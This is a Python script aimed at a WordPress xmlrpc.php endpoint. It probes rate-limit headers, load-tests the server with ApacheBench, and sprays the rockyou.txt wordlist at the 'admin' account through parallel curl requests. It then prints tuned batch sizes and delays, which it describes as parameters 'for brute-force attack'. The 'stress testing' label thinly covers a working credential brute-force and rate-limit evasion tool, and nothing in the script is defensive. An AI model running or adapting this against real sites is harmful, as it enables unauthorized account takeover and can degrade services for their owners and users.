import subprocess
import time
import re

# Configuration for the target server
# Replace x.x.x.x with target ip or domain name
target_url = "http://x.x.x.x/xmlrpc.php"
target_ip = "x.x.x.x"
username = "admin"
password_list_path = "/usr/share/wordlists/rockyou.txt"

# Stress test parameters
initial_delay = 0.1  # Initial delay in seconds for backoff
max_delay = 60  # Maximum delay in seconds after retries
batch_size = 500  # Start with 500 passwords per request
max_concurrent = 50  # Max concurrent requests for stress testing
backoff_factor = 1.5  # Backoff multiplier for exponential backoff
success_threshold = 5  # Threshold to reduce delay after successes

# Function to run a curl command and get headers and response time
def get_curl_info(url):
    try:
        result = subprocess.run(
            ["curl", "-I", url],
            capture_output=True,
            text=True,
            timeout=10
        )
        return result.stdout
    except subprocess.TimeoutExpired:
        return None

# Function to perform stress testing with ApacheBench (ab)
def stress_test_ab(url, total_requests, concurrent_requests):
    try:
        result = subprocess.run(
            ["ab", "-n", str(total_requests), "-c", str(concurrent_requests), url],
            capture_output=True,
            text=True,
            timeout=30
        )
        return result.stdout
    except subprocess.TimeoutExpired:
        return None

# Function to parse the result from ApacheBench and extract useful info
def parse_ab_result(result):
    requests_per_second = None
    time_per_request = None
    max_requests = None
    if result:
        # Extract Requests per second and Time per request from the output
        rps_match = re.search(r"Requests per second:\s+(\d+\.\d+)", result)
        tpr_match = re.search(r"Time per request:\s+(\d+\.\d+)", result)

        if rps_match:
            requests_per_second = float(rps_match.group(1))

        if tpr_match:
            time_per_request = float(tpr_match.group(1))

    return requests_per_second, time_per_request

# Function to perform a parallel curl test (simulate bursts of requests)
def parallel_curl_test(url, password_list, concurrent_requests):
    command = f"cat {password_list} | xargs -I {{}} -P {concurrent_requests} curl -s -o /dev/null -w \"%{{http_code}}\\n\" {url} --data \"username={username}&password={{}}\""
    try:
        result = subprocess.run(
            command, shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        return result.stdout
    except subprocess.TimeoutExpired:
        return None

# Function to analyse rate-limiting by inspecting curl headers
def analyse_rate_limiting(headers):
    rate_limit = None
    retry_after = None
    if headers:
        # Look for 'Retry-After' header to determine the rate-limiting time
        retry_match = re.search(r"Retry-After:\s+(\d+)", headers)
        if retry_match:
            retry_after = int(retry_match.group(1))
        # Extract rate limit (if present)
        limit_match = re.search(r"X-RateLimit-Limit:\s+(\d+)", headers)
        if limit_match:
            rate_limit = int(limit_match.group(1))

    return rate_limit, retry_after

# Function to run the full testing suite
def run_testing_suite():
    print("Running curl info test...")
    headers = get_curl_info(target_url)
    rate_limit, retry_after = analyse_rate_limiting(headers)

    if rate_limit:
        print(f"Rate limit (per time window): {rate_limit} requests")
    else:
        print("No explicit rate limit found in headers")

    if retry_after:
        print(f"Rate-limiting: Retry after {retry_after} seconds")
    
    # Introduce a delay to allow the server to "reset"
    print("\nWaiting 60 seconds before running next test to allow server reset...")
    time.sleep(60)

    print("\nRunning ApacheBench stress test...")
    ab_result = stress_test_ab(target_url, 1000, max_concurrent)
    requests_per_second, time_per_request = parse_ab_result(ab_result)

    print(f"Requests per second (RPS) the server can handle: {requests_per_second}")
    print(f"Time per request: {time_per_request} seconds")

    # Introduce a delay before running the parallel curl test
    print("\nWaiting 60 seconds before running parallel curl test to allow server reset...")
    time.sleep(60)

    print("\nRunning parallel curl test (simulating bursts)...")
    curl_result = parallel_curl_test(target_url, password_list_path, max_concurrent)
    if curl_result:
        print("Parallel curl test completed. Monitor for 403/429 responses.")
    
    # Final delay calculations based on rate-limiting behavior
    print("\nAnalyzing rate-limiting behavior...")
    delay = initial_delay
    if retry_after:
        delay = retry_after
        print(f"Applying {delay} seconds delay due to rate-limiting detected")
    
    # Adjust batch size based on results
    optimised_batch_size = batch_size  # Start with batch_size as 500
    if requests_per_second > 70:  # If RPS is high, increase the batch size
        optimised_batch_size = 1000
    elif requests_per_second < 50:  # If RPS is low, decrease the batch size
        optimised_batch_size = 200

    print(f"Optimized batch size: {optimised_batch_size}")

    return rate_limit, retry_after, requests_per_second, time_per_request, delay, optimised_batch_size

# Main function to run everything
def main():
    print("Starting stress testing suite...")
    rate_limit, retry_after, rps, tpr, delay, optimised_batch_size = run_testing_suite()
    
    print("\nOptimizing parameters for brute-force attack...")
    # Now, use the optimised parameters for the brute-force attack
    print(f"Max batch size: {optimised_batch_size}")
    print(f"Delay: {delay} seconds")
    print(f"Max RPS: {rps} requests/second")

if __name__ == "__main__":
    main()

